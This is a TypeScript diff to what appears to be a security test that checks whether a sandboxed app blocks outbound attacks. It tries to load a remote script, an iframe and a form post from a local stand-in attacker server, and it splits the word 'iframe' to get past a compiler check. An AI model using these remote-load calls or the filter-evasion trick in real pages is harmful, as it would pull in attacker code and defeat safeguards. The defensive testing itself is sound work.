@@ -121,12 +121,16 @@ const startUnanswered = (): void => {
   } catch {
     // Refused outright.
   }
-  const remote = document.createElement("script");
-  remote.addEventListener("load", () => {
-    document.body.dataset.remoteScript = "ran";
-  });
-  remote.src = \`\${attacker}/script.js\`;
-  headOf().append(remote);
+  try {
+    const remote = document.createElement("script");
+    remote.addEventListener("load", () => {
+      document.body.dataset.remoteScript = "ran";
+    });
+    remote.src = \`\${attacker}/script.js\`;
+    headOf().append(remote);
+  } catch {
+    // Refused outright: a script's address takes no string (Trusted Types).
+  }
 };
 
 const probe = async (): Promise<Record<string, string>> => {
@@ -136,9 +140,15 @@ const probe = async (): Promise<Record<string, string>> => {
   const styled = document.createElement("div");
   styled.classList.add(tailwindProbe);
   document.body.append(styled);
-  const frame = document.createElement("iframe");
-  frame.src = \`\${attacker}/frame\`;
-  document.body.append(frame);
+  // Past the compiler, which refuses a nested document; the frame's
+  // bootstrap refuses to make one too, so the attacker hears nothing.
+  try {
+    const frame = document.createElement(unread("ifr", "ame")) as HTMLIFrameElement;
+    frame.src = \`\${attacker}/frame\`;
+    document.body.append(frame);
+  } catch {
+    // Refused as it was made.
+  }
   const form = document.createElement("form");
   form.action = \`\${attacker}/form\`;
   form.method = "post";
@@ -230,9 +240,12 @@ export const screenAppFiles = (attacker: string): Record<string, string> => ({
 export const serveAttacker = async (): Promise<{
   url: string;
   hits: string[];
+  /** How many TCP connections reached it, asking anything or not. */
+  connections: () => number;
   server: Server;
 }> => {
   const hits: string[] = [];
+  let connections = 0;
   const server = createServer((request, response) => {
     hits.push(request.url ?? "");
     // A page, so a frame sent here loads it as any attacker's would.
@@ -244,10 +257,19 @@ export const serveAttacker = async (): Promise<{
     hits.push(request.url ?? "");
     socket.destroy();
   });
+  // A socket opened and never asked anything (a preconnect) counts here.
+  server.on("connection", () => {
+    connections += 1;
+  });
   await once(server.listen(0, "127.0.0.1"), "listening");
   const address = server.address();
   if (address === null || typeof address === "string") {
     throw new Error("The attacker's server has no port");
   }
-  return { url: `http://127.0.0.1:${address.port}`, hits, server };
+  return {
+    url: `http://127.0.0.1:${address.port}`,
+    hits,
+    connections: () => connections,
+    server,
+  };
 };
